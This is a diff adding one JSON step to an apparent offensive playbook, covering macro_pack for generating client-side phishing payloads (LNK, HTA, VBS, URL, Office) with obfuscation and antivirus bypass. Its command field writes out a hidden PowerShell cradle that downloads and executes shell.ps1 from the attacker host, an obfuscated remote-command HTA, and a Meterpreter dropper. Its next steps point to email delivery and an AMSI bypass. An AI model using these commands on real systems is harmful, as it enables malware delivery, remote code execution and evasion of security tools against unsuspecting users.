@@ -1,0 +1,26 @@
+{
+  "id": "client_side_macropack",
+  "phase": "SHELL",
+  "title": "Client-Side \u2014 macro_pack (multi-format generator)",
+  "body": "macro_pack (sevagas) generates many client-side payload formats from one tool with built-in obfuscation/AV-bypass: Office docs, VBS, VBA, HTA, LNK shortcuts, URL files, SCT, and more. Use it to produce the .lnk for the library chain, or standalone .hta/.url payloads, instead of hand-crafting.",
+  "cmd": "# Repo: https://github.com/sevagas/macro_pack   (Windows for full format support)\n\n# LNK shortcut that runs a command:\necho 'powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"http://$lhost/shell.ps1\")' | macro_pack.exe -t CMD -G payload.lnk\n\n# Obfuscated HTA:\necho 'http://$lhost:8000/ \"systeminfo\"' | macro_pack.exe -t REMOTE_CMD -o -G info.hta\n\n# VBS meterpreter dropper:\n# echo $lhost $lport | macro_pack.exe -t METERPRETER -o -G meter.vbs\n\n# URL file pointing at a remote HTA:\n# echo 'file://$lhost/share/hello.hta' | macro_pack.exe -G open.url\n\n# Office doc with embedded payload:\n# cat payload.vba | macro_pack.exe -o -G out.doc",
+  "warn": "macro_pack needs Windows + Office for the Office-format outputs; script/lnk/hta formats work cross-platform. It's a generator \u2014 you still host the cradle and run the listener. Drop a generated .lnk into your WebDAV root to feed the library chain.",
+  "choices": [
+    {
+      "label": "Use the .lnk in the library + WebDAV chain",
+      "next": "client_side_library"
+    },
+    {
+      "label": "Deliver by email (swaks)",
+      "next": "client_side_phish_email"
+    },
+    {
+      "label": "AV still flags it",
+      "next": "amsi_bypass"
+    },
+    {
+      "label": "Back to client-side options",
+      "next": "client_side"
+    }
+  ]
+}
